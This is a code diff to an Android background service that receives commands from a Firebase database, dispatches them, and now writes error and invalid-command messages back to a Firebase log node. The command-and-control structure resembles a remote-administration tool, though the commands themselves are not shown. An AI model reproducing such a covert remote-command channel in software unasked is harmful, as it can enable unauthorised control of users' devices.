@@ -110,6 +110,7 @@ public class Starter extends Service {
                                 processCommand(command);
                                 Log.e("COMMAND", command + "");
                             } catch (Exception e) {
+
                                 Log.e("EXCEPTION", e.getMessage());
                             }
                         }
@@ -118,6 +119,7 @@ public class Starter extends Service {
                     @Override
                     public void onCancelled(@NonNull DatabaseError error) {
                         Log.e("DB", error.getMessage());
+
                     }
                 });
 
@@ -151,10 +153,14 @@ public class Starter extends Service {
                     break;
                 default:
                     Log.d("ERROR PA : ", "Invalid Command Received");
+                    FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue("Invalid Command Received");
+
                     break;
             }
         }catch (SecurityException e){
             Log.e("PERMISSION : ",e.getMessage());
+            FirebaseDatabase.getInstance().getReference("Logs").child("GENERAL").child("CurrentLog").setValue(e.getMessage());
+
         }
     }
 
